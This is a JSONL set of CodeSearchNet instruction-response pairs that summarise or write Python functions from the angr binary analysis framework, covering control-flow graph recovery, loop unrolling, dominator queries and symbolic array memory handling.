{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_addr(self, v):\n\n        if isinstance(v, CFGNode):\n            return v.addr\n        elif type(v) is int:\n            return v\n        else:\n            raise AngrBladeError('Unsupported SimRun argument type %s' % type(v))", "response": "Get the address of the basic block or CFG node specified by v."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _concat_flags(nbits, flags_vec):\n\n    result = claripy.BVV(0, 0)\n    for offset, bit in flags_vec:\n        current_position = nbits - 1 - result.length\n        result = result.concat(claripy.BVV(0, current_position - offset), bit)\n    result = result.concat(claripy.BVV(0, nbits - result.length))\n    return result", "response": "Concatenate different flag BVs to a single BV. Currently used for ARM X86 and AMD64."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _simplify(self):\n\n        r = self.region\n        r = self._simplify_gotos(r)\n        r = self._simplify_ifs(r)\n\n        self.result = r", "response": "Simplify the set of entries in the region."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse(cls, s, **kwargs):\n\n        pb2_obj = cls._get_cmsg()\n        pb2_obj.ParseFromString(s)\n\n        return cls.parse_from_cmessage(pb2_obj, **kwargs)", "response": "Parse a bytes object and create a class object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nstoring the elements of the array in the memory.", "response": "def store_array_elements(self, array, start_idx, data):\n        \"\"\"\n        Stores either a single element or a range of elements in the array.\n\n        :param array:     Reference to the array.\n        :param start_idx: Starting index for the store.\n        :param data:      Either a single value or a list of values.\n        \"\"\"\n        # we process data as a list of elements\n        # => if there is only a single element, wrap it in a list\n        data = data if isinstance(data, list) else [data]\n\n        # concretize start index\n        concrete_start_idxes = self.concretize_store_idx(start_idx)\n\n        if len(concrete_start_idxes) == 1:\n            # only one start index\n            # => concrete store\n            concrete_start_idx = concrete_start_idxes[0]\n            for i, value in enumerate(data):\n                self._store_array_element_on_heap(array=array,\n                                                  idx=concrete_start_idx+i,\n                                                  value=value,\n                                                  value_type=array.element_type)\n            # if the index was symbolic before concretization, this\n            # constraint it to concrete start idx\n            self.state.solver.add(concrete_start_idx == start_idx)\n\n        else:\n            # multiple start indexes\n            # => symbolic store\n            start_idx_options = []\n            for concrete_start_idx in concrete_start_idxes:\n                start_idx_options.append(concrete_start_idx == start_idx)\n                # we store elements condtioned with the start index:\n                # => if concrete_start_idx == start_idx\n                #    then store the value\n                #    else keep the current value\n                for i, value in enumerate(data):\n                    self._store_array_element_on_heap(array=array,\n                                                      idx=concrete_start_idx+i,\n                                                      value=value,\n                                                      value_type=array.element_type,\n                                                      store_condition=start_idx_options[-1])\n\n            # constraint start_idx, s.t. it evals to one of the concretized indexes\n            constraint_on_start_idx = self.state.solver.Or(*start_idx_options)\n            self.state.add_constraints(constraint_on_start_idx)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nload a range of elements from the array.", "response": "def load_array_elements(self, array, start_idx, no_of_elements):\n        \"\"\"\n        Loads either a single element or a range of elements from the array.\n\n        :param array:           Reference to the array.\n        :param start_idx:       Starting index for the load.\n        :param no_of_elements:  Number of elements to load.\n\n        \"\"\"\n        # concretize start index\n        concrete_start_idxes = self.concretize_load_idx(start_idx)\n\n        if len(concrete_start_idxes) == 1:\n            # only one start index\n            # => concrete load\n            concrete_start_idx = concrete_start_idxes[0]\n            load_values = [self._load_array_element_from_heap(array, idx)\n                           for idx in range(concrete_start_idx, concrete_start_idx+no_of_elements)]\n            # if the index was symbolic before concretization, this\n            # constraint it to concrete start idx\n            self.state.solver.add(start_idx == concrete_start_idx)\n\n        else:\n            # multiple start indexes\n            # => symbolic load\n\n            # start with load values for the first concrete index\n            concrete_start_idx = concrete_start_idxes[0]\n            load_values = [self._load_array_element_from_heap(array, idx)\n                           for idx in range(concrete_start_idx, concrete_start_idx+no_of_elements)]\n            start_idx_options = [concrete_start_idx == start_idx]\n\n            # update load values with all remaining start indexes\n            for concrete_start_idx in concrete_start_idxes[1:]:\n                # load values for this start index\n                values = [self._load_array_element_from_heap(array, idx)\n                          for idx in range(concrete_start_idx, concrete_start_idx+no_of_elements)]\n                # update load values with the new ones\n                for i, value in enumerate(values):\n                    # condition every value with the start idx\n                    # => if concrete_start_idx == start_idx\n                    #    then use new value\n                    #    else use the current value\n                    load_values[i] = self.state.solver.If(\n                        concrete_start_idx == start_idx,\n                        value,\n                        load_values[i]\n                    )\n                start_idx_options.append(start_idx == concrete_start_idx)\n\n            # constraint start_idx, s.t. it evals to one of the concretized indexes\n            constraint_on_start_idx = self.state.solver.Or(*start_idx_options)\n            self.state.add_constraints(constraint_on_start_idx)\n\n        return load_values"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\napply concretization strategies on the index until one of them succeeds.", "response": "def _apply_concretization_strategies(self, idx, strategies, action): # pylint: disable=unused-argument\n        \"\"\"\n        Applies concretization strategies on the index, until one of them succeeds.\n        \"\"\"\n\n        for s in strategies:\n            try:\n                idxes = s.concretize(self, idx)\n            except SimUnsatError:\n                idxes = None\n\n            if idxes:\n                return idxes\n\n        raise SimMemoryAddressError(\"Unable to concretize index %s\" % idx)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef concretize_store_idx(self, idx, strategies=None):\n        if isinstance(idx, int):\n            return [idx]\n        elif not self.state.solver.symbolic(idx):\n            return [self.state.solver.eval(idx)]\n\n        strategies = self.store_strategies if strategies is None else strategies\n        return self._apply_concretization_strategies(idx, strategies, 'store')", "response": "Concretizes a store index."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef copy(self):\n        new_cfg = CFGEmulated.__new__(CFGEmulated)\n        super(CFGEmulated, self).make_copy(new_cfg)\n\n        new_cfg._indirect_jump_target_limit = self._indirect_jump_target_limit\n        new_cfg.named_errors = dict(self.named_errors)\n        new_cfg.errors = list(self.errors)\n        new_cfg._fail_fast = self._fail_fast\n        new_cfg._max_steps = self._max_steps\n        new_cfg.project = self.project\n\n        # Intelligently (or stupidly... you tell me) fill it up\n        new_cfg._edge_map = self._edge_map.copy()\n        new_cfg._loop_back_edges = self._loop_back_edges[::]\n        new_cfg._executable_address_ranges = self._executable_address_ranges[::]\n        new_cfg._unresolvable_runs = self._unresolvable_runs.copy()\n        new_cfg._overlapped_loop_headers = self._overlapped_loop_headers[::]\n        new_cfg._thumb_addrs = self._thumb_addrs.copy()\n        new_cfg._keep_state = self._keep_state\n\n        return new_cfg", "response": "Make a copy of the CFG."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef resume(self, starts=None, max_steps=None):\n\n        self._starts = starts\n        self._max_steps = max_steps\n\n        self._sanitize_starts()\n\n        self._analyze()", "response": "Resume a paused or terminated control flow graph recovery."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nremoving all cycles from the current graph.", "response": "def remove_cycles(self):\n        \"\"\"\n        Forces graph to become acyclic, removes all loop back edges and edges between overlapped loop headers and their\n        successors.\n        \"\"\"\n        # loop detection\n        # only detect loops after potential graph normalization\n        if not self._loop_back_edges:\n            l.debug(\"Detecting loops...\")\n            self._detect_loops()\n\n        l.debug(\"Removing cycles...\")\n        l.debug(\"There are %d loop back edges.\", len(self._loop_back_edges))\n        l.debug(\"And there are %d overlapping loop headers.\", len(self._overlapped_loop_headers))\n        # First break all detected loops\n        for b1, b2 in self._loop_back_edges:\n            if self._graph.has_edge(b1, b2):\n                l.debug(\"Removing loop back edge %s -> %s\", b1, b2)\n                self._graph.remove_edge(b1, b2)\n        # Then remove all outedges from overlapped loop headers\n        for b in self._overlapped_loop_headers:\n            successors = self._graph.successors(b)\n            for succ in successors:\n                self._graph.remove_edge(b, succ)\n                l.debug(\"Removing partial loop header edge %s -> %s\", b, succ)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nunrolling loops for each function.", "response": "def unroll_loops(self, max_loop_unrolling_times):\n        \"\"\"\n        Unroll loops for each function. The resulting CFG may still contain loops due to recursion, function calls, etc.\n\n        :param int max_loop_unrolling_times: The maximum iterations of unrolling.\n        :return: None\n        \"\"\"\n\n        if not isinstance(max_loop_unrolling_times, int) or \\\n                        max_loop_unrolling_times < 0:\n            raise AngrCFGError('Max loop unrolling times must be set to an integer greater than or equal to 0 if ' +\n                               'loop unrolling is enabled.')\n\n        def _unroll(graph, loop):\n            \"\"\"\n            The loop callback method where loops are unrolled.\n\n            :param networkx.DiGraph graph: The control flow graph.\n            :param angr.analyses.loopfinder.Loop loop: The loop instance.\n            :return: None\n            \"\"\"\n\n            for back_edge in loop.continue_edges:\n                loop_body_addrs = {n.addr for n in loop.body_nodes}\n                src_blocknode = back_edge[0]  # type: angr.knowledge.codenode.BlockNode\n                dst_blocknode = back_edge[1]  # type: angr.knowledge.codenode.BlockNode\n\n                for src in self.get_all_nodes(src_blocknode.addr):\n                    for dst in graph.successors(src):\n                        if dst.addr != dst_blocknode.addr:\n                            continue\n\n                        # Duplicate the dst node\n                        new_dst = dst.copy()\n                        new_dst.looping_times = dst.looping_times + 1\n                        if (new_dst not in graph and\n                                # If the new_dst is already in the graph, we don't want to keep unrolling\n                                # the this loop anymore since it may *create* a new loop. Of course we\n                                # will lose some edges in this way, but in general it is acceptable.\n                                new_dst.looping_times <= max_loop_unrolling_times\n                            ):\n                            # Log all successors of the dst node\n                            dst_successors = graph.successors(dst)\n                            # Add new_dst to the graph\n                            edge_data = graph.get_edge_data(src, dst)\n                            graph.add_edge(src, new_dst, **edge_data)\n                            for ds in dst_successors:\n                                if ds.looping_times == 0 and ds.addr not in loop_body_addrs:\n                                    edge_data = graph.get_edge_data(dst, ds)\n                                    graph.add_edge(new_dst, ds, **edge_data)\n\n                        graph.remove_edge(src, dst)\n\n        self._detect_loops(loop_callback=_unroll)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef force_unroll_loops(self, max_loop_unrolling_times):\n\n        if not isinstance(max_loop_unrolling_times, int) or \\\n                        max_loop_unrolling_times < 0:\n            raise AngrCFGError('Max loop unrolling times must be set to an integer greater than or equal to 0 if ' +\n                               'loop unrolling is enabled.')\n\n        # Traverse the CFG and try to find the beginning of loops\n        loop_backedges = []\n\n        start = self._starts[0]\n        if isinstance(start, tuple):\n            start, _ = start  # pylint: disable=unpacking-non-sequence\n        start_node = self.get_any_node(start)\n        if start_node is None:\n            raise AngrCFGError('Cannot find start node when trying to unroll loops. The CFG might be empty.')\n\n        graph_copy = networkx.DiGraph(self.graph)\n\n        while True:\n            cycles_iter = networkx.simple_cycles(graph_copy)\n            try:\n                cycle = next(cycles_iter)\n            except StopIteration:\n                break\n\n            loop_backedge = (None, None)\n\n            for n in networkx.dfs_preorder_nodes(graph_copy, source=start_node):\n                if n in cycle:\n                    idx = cycle.index(n)\n                    if idx == 0:\n                        loop_backedge = (cycle[-1], cycle[idx])\n                    else:\n                        loop_backedge = (cycle[idx - 1], cycle[idx])\n                    break\n\n            if loop_backedge not in loop_backedges:\n                loop_backedges.append(loop_backedge)\n\n            # Create a common end node for all nodes whose out_degree is 0\n            end_nodes = [n for n in graph_copy.nodes() if graph_copy.out_degree(n) == 0]\n            new_end_node = \"end_node\"\n\n            if not end_nodes:\n                # We gotta randomly break a loop\n                cycles = sorted(networkx.simple_cycles(graph_copy), key=len)\n                first_cycle = cycles[0]\n                if len(first_cycle) == 1:\n                    graph_copy.remove_edge(first_cycle[0], first_cycle[0])\n                else:\n                    graph_copy.remove_edge(first_cycle[0], first_cycle[1])\n                end_nodes = [n for n in graph_copy.nodes() if graph_copy.out_degree(n) == 0]\n\n            for en in end_nodes:\n                graph_copy.add_edge(en, new_end_node)\n\n            # postdoms = self.immediate_postdominators(new_end_node, target_graph=graph_copy)\n            # reverse_postdoms = defaultdict(list)\n            # for k, v in postdoms.items():\n            #    reverse_postdoms[v].append(k)\n\n            # Find all loop bodies\n            # for src, dst in loop_backedges:\n            #    nodes_in_loop = { src, dst }\n\n            #    while True:\n            #        new_nodes = set()\n\n            #        for n in nodes_in_loop:\n            #            if n in reverse_postdoms:\n            #                for node in reverse_postdoms[n]:\n            #                    if node not in nodes_in_loop:\n            #                        new_nodes.add(node)\n\n            #        if not new_nodes:\n            #            break\n\n            #        nodes_in_loop |= new_nodes\n\n            # Unroll the loop body\n            # TODO: Finish the implementation\n\n            graph_copy.remove_node(new_end_node)\n            src, dst = loop_backedge\n            if graph_copy.has_edge(src, dst):  # It might have been removed before\n                # Duplicate the dst node\n                new_dst = dst.copy()\n                new_dst.looping_times = dst.looping_times + 1\n                if (\n                        new_dst not in graph_copy and\n                        # If the new_dst is already in the graph, we don't want to keep unrolling\n                        # the this loop anymore since it may *create* a new loop. Of course we\n                        # will lose some edges in this way, but in general it is acceptable.\n                        new_dst.looping_times <= max_loop_unrolling_times):\n                    # Log all successors of the dst node\n                    dst_successors = list(graph_copy.successors(dst))\n                    # Add new_dst to the graph\n                    edge_data = graph_copy.get_edge_data(src, dst)\n                    graph_copy.add_edge(src, new_dst, **edge_data)\n                    for ds in dst_successors:\n                        if ds.looping_times == 0 and ds not in cycle:\n                            edge_data = graph_copy.get_edge_data(dst, ds)\n                            graph_copy.add_edge(new_dst, ds, **edge_data)\n                # Remove the original edge\n                graph_copy.remove_edge(src, dst)\n\n        # Update loop backedges\n        self._loop_back_edges = loop_backedges\n\n        self.model.graph = graph_copy", "response": "Unroll loops globally. The resulting CFG does not contain any loop, but this method is slow on large graphs.\n\n        :param int max_loop_unrolling_times: The maximum iterations of unrolling.\n        :return: None"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets all immediate dominators of sub graph from given node upwards.", "response": "def immediate_dominators(self, start, target_graph=None):\n        \"\"\"\n        Get all immediate dominators of sub graph from given node upwards.\n\n        :param str start: id of the node to navigate forwards from.\n        :param networkx.classes.digraph.DiGraph target_graph: graph to analyse, default is self.graph.\n\n        :return: each node of graph as index values, with element as respective node's immediate dominator.\n        :rtype: dict\n        \"\"\"\n        return self._immediate_dominators(start, target_graph=target_graph, reverse_graph=False)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget all immediate postdominators of sub graph from given node upwards.", "response": "def immediate_postdominators(self, end, target_graph=None):\n        \"\"\"\n        Get all immediate postdominators of sub graph from given node upwards.\n\n        :param str start: id of the node to navigate forwards from.\n        :param networkx.classes.digraph.DiGraph target_graph: graph to analyse, default is self.graph.\n\n        :return: each node of graph as index values, with element as respective node's immediate dominator.\n        :rtype: dict\n        \"\"\"\n        return self._immediate_dominators(end, target_graph=target_graph, reverse_graph=True)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nremoving fake returns from this CFG", "response": "def remove_fakerets(self):\n        \"\"\"\n        Get rid of fake returns (i.e., Ijk_FakeRet edges) from this CFG\n\n        :return: None\n        \"\"\"\n        fakeret_edges = [ (src, dst) for src, dst, data in self.graph.edges(data=True)\n                         if data['jumpkind'] == 'Ijk_FakeRet' ]\n        self.graph.remove_edges_from(fakeret_edges)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_topological_order(self, cfg_node):\n\n        if not self._quasi_topological_order:\n            self._quasi_topological_sort()\n\n        return self._quasi_topological_order.get(cfg_node, None)", "response": "Get the topological order of a CFG Node."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_subgraph(self, starting_node, block_addresses):\n\n        graph = networkx.DiGraph()\n\n        if starting_node not in self.graph:\n            raise AngrCFGError('get_subgraph(): the specified \"starting_node\" %s does not exist in the current CFG.'\n                               % starting_node\n                               )\n\n        addr_set = set(block_addresses)\n\n        graph.add_node(starting_node)\n        queue = [ starting_node ]\n\n        while queue:\n            node = queue.pop()\n            for _, dst, data in self.graph.out_edges([node], data=True):\n                if dst not in graph and dst.addr in addr_set:\n                    graph.add_edge(node, dst, **data)\n                    queue.append(dst)\n\n        cfg = self.copy()\n        cfg._graph = graph\n        cfg._starts = (starting_node.addr, )\n\n        return cfg", "response": "Get a sub - graph out of a bunch of basic block addresses."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_function_subgraph(self, start, max_call_depth=None):\n\n        # FIXME: syscalls are not supported\n        # FIXME: start should also take a CFGNode instance\n\n        start_node = self.get_any_node(start)\n\n        node_wrapper = (start_node, 0)\n        stack = [node_wrapper]\n        traversed_nodes = {start_node}\n        subgraph_nodes = set([start_node])\n\n        while stack:\n            nw = stack.pop()\n            n, call_depth = nw[0], nw[1]\n\n            # Get successors\n            edges = self.graph.out_edges(n, data=True)\n\n            for _, dst, data in edges:\n                if dst not in traversed_nodes:\n                    # We see a new node!\n                    traversed_nodes.add(dst)\n\n                    if data['jumpkind'] == 'Ijk_Call':\n                        if max_call_depth is None or (max_call_depth is not None and call_depth < max_call_depth):\n                            subgraph_nodes.add(dst)\n                            new_nw = (dst, call_depth + 1)\n                            stack.append(new_nw)\n                    elif data['jumpkind'] == 'Ijk_Ret':\n                        if call_depth > 0:\n                            subgraph_nodes.add(dst)\n                            new_nw = (dst, call_depth - 1)\n                            stack.append(new_nw)\n                    else:\n                        subgraph_nodes.add(dst)\n                        new_nw = (dst, call_depth)\n                        stack.append(new_nw)\n\n       #subgraph = networkx.subgraph(self.graph, subgraph_nodes)\n        subgraph = self.graph.subgraph(subgraph_nodes).copy()\n\n        # Make it a CFG instance\n        subcfg = self.copy()\n        subcfg._graph = subgraph\n        subcfg._starts = (start,)\n\n        return subcfg", "response": "Get a sub - graph of a certain function."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef deadends(self):\n        if self.graph is None:\n            raise AngrCFGError('CFG hasn\\'t been generated yet.')\n\n        deadends = [i for i in self.graph if self.graph.out_degree(i) == 0]\n\n        return deadends", "response": "Get all CFGNodes that have an out - degree of 0"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsanitizing the parameters of the CFG object.", "response": "def _sanitize_parameters(self):\n        \"\"\"\n        Perform a sanity check on parameters passed in to CFG.__init__().\n        An AngrCFGError is raised if any parameter fails the sanity check.\n\n        :return: None\n        \"\"\"\n\n        # Check additional_edges\n        if isinstance(self._additional_edges, (list, set, tuple)):\n            new_dict = defaultdict(list)\n            for s, d in self._additional_edges:\n                new_dict[s].append(d)\n            self._additional_edges = new_dict\n\n        elif isinstance(self._additional_edges, dict):\n            pass\n\n        else:\n            raise AngrCFGError('Additional edges can only be a list, set, tuple, or a dict.')\n\n        # Check _advanced_backward_slicing\n        if self._advanced_backward_slicing and self._enable_symbolic_back_traversal:\n            raise AngrCFGError('Advanced backward slicing and symbolic back traversal cannot both be enabled.')\n\n        if self._advanced_backward_slicing and not self._keep_state:\n            raise AngrCFGError('Keep state must be enabled if advanced backward slicing is enabled.')\n\n        # Sanitize avoid_runs\n        self._avoid_runs = [ ] if self._avoid_runs is None else self._avoid_runs\n        if not isinstance(self._avoid_runs, (list, set)):\n            raise AngrCFGError('\"avoid_runs\" must either be None, or a list or a set.')\n\n        self._sanitize_starts()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _job_sorting_key(self, job):\n\n        if self._base_graph is None:\n            # we don't do sorting if there is no base_graph\n            return 0\n\n        MAX_JOBS = 1000000\n\n        if job.addr not in self._node_addr_visiting_order:\n            return MAX_JOBS\n\n        return self._node_addr_visiting_order.index(job.addr)", "response": "Get the sorting key of a CFGJob instance."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _pre_analysis(self):\n\n        # Fill up self._starts\n        for item in self._starts:\n            callstack = None\n            if isinstance(item, tuple):\n                # (addr, jumpkind)\n                ip = item[0]\n                state = self._create_initial_state(item[0], item[1])\n\n            elif isinstance(item, SimState):\n                # SimState\n                state = item.copy()  # pylint: disable=no-member\n                ip = state.solver.eval_one(state.ip)\n                self._reset_state_mode(state, 'fastpath')\n\n            else:\n                raise AngrCFGError('Unsupported CFG start type: %s.' % str(type(item)))\n\n            self._symbolic_function_initial_state[ip] = state\n            path_wrapper = CFGJob(ip, state, self._context_sensitivity_level, None, None, call_stack=callstack)\n            key = path_wrapper.block_id\n            if key not in self._start_keys:\n                self._start_keys.append(key)\n\n            self._insert_job(path_wrapper)\n            self._register_analysis_job(path_wrapper.func_addr, path_wrapper)", "response": "Initializes work. Executed prior to the analysis."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a state object for a specific address and jumpkind.", "response": "def _create_initial_state(self, ip, jumpkind):\n        \"\"\"\n        Obtain a SimState object for a specific address\n\n        Fastpath means the CFG generation will work in an IDA-like way, in which it will not try to execute every\n        single statement in the emulator, but will just do the decoding job. This is much faster than the old way.\n\n        :param int ip: The instruction pointer\n        :param str jumpkind: The jumpkind upon executing the block\n        :return: The newly-generated state\n        :rtype: SimState\n        \"\"\"\n\n        jumpkind = \"Ijk_Boring\" if jumpkind is None else jumpkind\n\n        if self._initial_state is None:\n            state = self.project.factory.blank_state(addr=ip, mode=\"fastpath\",\n                                                     add_options=self._state_add_options,\n                                                     remove_options=self._state_remove_options,\n                                                     )\n            self._initial_state = state\n        else:\n            # FIXME: self._initial_state is deprecated. This branch will be removed soon\n            state = self._initial_state\n            state.history.jumpkind = jumpkind\n            self._reset_state_mode(state, 'fastpath')\n            state._ip = state.solver.BVV(ip, self.project.arch.bits)\n\n        if jumpkind is not None:\n            state.history.jumpkind = jumpkind\n\n        # THIS IS A HACK FOR MIPS\n        if ip is not None and self.project.arch.name in ('MIPS32', 'MIPS64'):\n            # We assume this is a function start\n            state.regs.t9 = ip\n        # TODO there was at one point special logic for the ppc64 table of contents but it seems to have bitrotted\n\n        return state"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_one_pending_job(self):\n\n        pending_job_key, pending_job = self._pending_jobs.popitem()\n        pending_job_state = pending_job.state\n        pending_job_call_stack = pending_job.call_stack\n        pending_job_src_block_id = pending_job.src_block_id\n        pending_job_src_exit_stmt_idx = pending_job.src_exit_stmt_idx\n\n        self._deregister_analysis_job(pending_job.caller_func_addr, pending_job)\n\n        # Let's check whether this address has been traced before.\n        if pending_job_key in self._nodes:\n            node = self._nodes[pending_job_key]\n            if node in self.graph:\n                pending_exit_addr = self._block_id_addr(pending_job_key)\n                # That block has been traced before. Let's forget about it\n                l.debug(\"Target 0x%08x has been traced before. Trying the next one...\", pending_exit_addr)\n\n                # However, we should still create the FakeRet edge\n                self._graph_add_edge(pending_job_src_block_id, pending_job_key, jumpkind=\"Ijk_FakeRet\",\n                                     stmt_idx=pending_job_src_exit_stmt_idx, ins_addr=pending_job.src_exit_ins_addr)\n\n                return None\n\n        pending_job_state.history.jumpkind = 'Ijk_FakeRet'\n\n        job = CFGJob(pending_job_state.addr,\n                     pending_job_state,\n                     self._context_sensitivity_level,\n                     src_block_id=pending_job_src_block_id,\n                     src_exit_stmt_idx=pending_job_src_exit_stmt_idx,\n                     src_ins_addr=pending_job.src_exit_ins_addr,\n                     call_stack=pending_job_call_stack,\n        )\n        l.debug(\"Tracing a missing return exit %s\", self._block_id_repr(pending_job_key))\n\n        return job", "response": "Retrieve a pending job."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nprocess function hints in the binary.", "response": "def _process_hints(self, analyzed_addrs):\n        \"\"\"\n        Process function hints in the binary.\n\n        :return: None\n        \"\"\"\n\n        # Function hints!\n        # Now let's see how many new functions we can get here...\n        while self._pending_function_hints:\n            f = self._pending_function_hints.pop()\n            if f not in analyzed_addrs:\n                new_state = self.project.factory.entry_state(mode='fastpath')\n                new_state.ip = new_state.solver.BVV(f, self.project.arch.bits)\n\n                # TOOD: Specially for MIPS\n                if new_state.arch.name in ('MIPS32', 'MIPS64'):\n                    # Properly set t9\n                    new_state.registers.store('t9', f)\n\n                new_path_wrapper = CFGJob(f,\n                                          new_state,\n                                          self._context_sensitivity_level\n                                          )\n                self._insert_job(new_path_wrapper)\n                self._register_analysis_job(f, new_path_wrapper)\n                l.debug('Picking a function 0x%x from pending function hints.', f)\n                self.kb.functions.function(new_path_wrapper.func_addr, create=True)\n                break"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\npost - CFG - construction.", "response": "def _post_analysis(self):\n        \"\"\"\n        Post-CFG-construction.\n\n        :return: None\n        \"\"\"\n\n        self._make_completed_functions()\n        new_changes = self._iteratively_analyze_function_features()\n        functions_do_not_return = new_changes['functions_do_not_return']\n        self._update_function_callsites(functions_do_not_return)\n\n        # Create all pending edges\n        for _, edges in self._pending_edges.items():\n            for src_node, dst_node, data in edges:\n                self._graph_add_edge(src_node, dst_node, **data)\n\n        # Remove those edges that will never be taken!\n        self._remove_non_return_edges()\n\n        CFGBase._post_analysis(self)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting a collection of successors out of the current job.", "response": "def _get_successors(self, job):\n        \"\"\"\n        Get a collection of successors out of the current job.\n\n        :param CFGJob job:  The CFGJob instance.\n        :return:            A collection of successors.\n        :rtype:             list\n        \"\"\"\n\n        addr = job.addr\n        sim_successors = job.sim_successors\n        cfg_node = job.cfg_node\n        input_state = job.state\n        func_addr = job.func_addr\n\n        # check step limit\n        if self._max_steps is not None:\n            depth = cfg_node.depth\n            if depth >= self._max_steps:\n                return [ ]\n\n        successors = [ ]\n        is_indirect_jump = sim_successors.sort == 'IRSB' and self._is_indirect_jump(cfg_node, sim_successors)\n        indirect_jump_resolved_by_resolvers = False\n\n        if is_indirect_jump and self._resolve_indirect_jumps:\n            # Try to resolve indirect jumps\n            irsb = input_state.block().vex\n\n            resolved, resolved_targets, ij = self._indirect_jump_encountered(addr, cfg_node, irsb, func_addr,\n                                                                             stmt_idx=DEFAULT_STATEMENT)\n            if resolved:\n                successors = self._convert_indirect_jump_targets_to_states(job, resolved_targets)\n                if ij:\n                    self._indirect_jump_resolved(ij, ij.addr, None, resolved_targets)\n            else:\n                # Try to resolve this indirect jump using heavier approaches\n                resolved_targets = self._process_one_indirect_jump(ij)\n                successors = self._convert_indirect_jump_targets_to_states(job, resolved_targets)\n\n            if successors:\n                indirect_jump_resolved_by_resolvers = True\n            else:\n                # It's unresolved. Add it to the wait list (but apparently we don't have any better way to resolve it\n                # right now).\n                self._indirect_jumps_to_resolve.add(ij)\n\n        if not successors:\n            # Get all successors of this block\n            successors = (sim_successors.flat_successors + sim_successors.unsat_successors) \\\n                if addr not in self._avoid_runs else []\n\n        # Post-process successors\n        successors, job.extra_info = self._post_process_successors(input_state, sim_successors, successors)\n\n        all_successors = successors + sim_successors.unconstrained_successors\n\n        # make sure FakeRets are at the last\n        all_successors = [ suc for suc in all_successors if suc.history.jumpkind != 'Ijk_FakeRet' ] + \\\n                         [ suc for suc in all_successors if suc.history.jumpkind == 'Ijk_FakeRet' ]\n\n        if self._keep_state:\n            cfg_node.final_states = all_successors[::]\n\n        if is_indirect_jump and not indirect_jump_resolved_by_resolvers:\n            # For indirect jumps, filter successors that do not make sense\n            successors = self._filter_insane_successors(successors)\n\n        successors = self._try_resolving_indirect_jumps(sim_successors,\n                                                        cfg_node,\n                                                        func_addr,\n                                                        successors,\n                                                        job.exception_info,\n                                                        self._block_artifacts)\n        # Remove all successors whose IP is symbolic\n        successors = [ s for s in successors if not s.ip.symbolic ]\n\n        # Add additional edges supplied by the user\n        successors = self._add_additional_edges(input_state, sim_successors, cfg_node, successors)\n\n        # if base graph is used, add successors implied from the graph\n        if self._base_graph:\n            basegraph_successor_addrs = set()\n            for src_, dst_ in self._base_graph.edges():\n                if src_.addr == addr:\n                    basegraph_successor_addrs.add(dst_.addr)\n            successor_addrs = {s.solver.eval(s.ip) for s in successors}\n            extra_successor_addrs = basegraph_successor_addrs - successor_addrs\n\n            if all_successors:  # make sure we have a base state to use\n                base_state = all_successors[0]  # TODO: for calls, we want to use the fake_ret state\n\n                for s_addr in extra_successor_addrs:\n                    # an extra target\n                    successor_state = base_state.copy()\n                    successor_state.ip = s_addr\n                    successors.append(successor_state)\n            else:\n                if extra_successor_addrs:\n                    l.error('CFGEmulated terminates at %#x although base graph provided more exits.', addr)\n\n        if not successors:\n            # There is no way out :-(\n            # Log it first\n            self._push_unresolvable_run(addr)\n\n            if sim_successors.sort == 'SimProcedure' and isinstance(sim_successors.artifacts['procedure'],\n                    SIM_PROCEDURES[\"stubs\"][\"PathTerminator\"]):\n                # If there is no valid exit in this branch and it's not\n                # intentional (e.g. caused by a SimProcedure that does not\n                # do_return) , we should make it return to its call-site. However,\n                # we don't want to use its state anymore as it might be corrupted.\n                # Just create an edge in the graph.\n                return_target = job.call_stack.current_return_target\n                if return_target is not None:\n                    new_call_stack = job.call_stack_copy()\n                    return_target_key = self._generate_block_id(\n                        new_call_stack.stack_suffix(self.context_sensitivity_level),\n                        return_target,\n                        False\n                    )  # You can never return to a syscall\n\n                    if not cfg_node.instruction_addrs:\n                        ret_ins_addr = None\n                    else:\n                        if self.project.arch.branch_delay_slot:\n                            if len(cfg_node.instruction_addrs) > 1:\n                                ret_ins_addr = cfg_node.instruction_addrs[-2]\n                            else:\n                                l.error('At %s: expecting more than one instruction. Only got one.', cfg_node)\n                                ret_ins_addr = None\n                        else:\n                            ret_ins_addr = cfg_node.instruction_addrs[-1]\n\n                    # Things might be a bit difficult here. _graph_add_edge() requires both nodes to exist, but here\n                    # the return target node may not exist yet. If that's the case, we will put it into a \"delayed edge\n                    # list\", and add this edge later when the return target CFGNode is created.\n                    if return_target_key in self._nodes:\n                        self._graph_add_edge(job.block_id, return_target_key, jumpkind='Ijk_Ret',\n                                             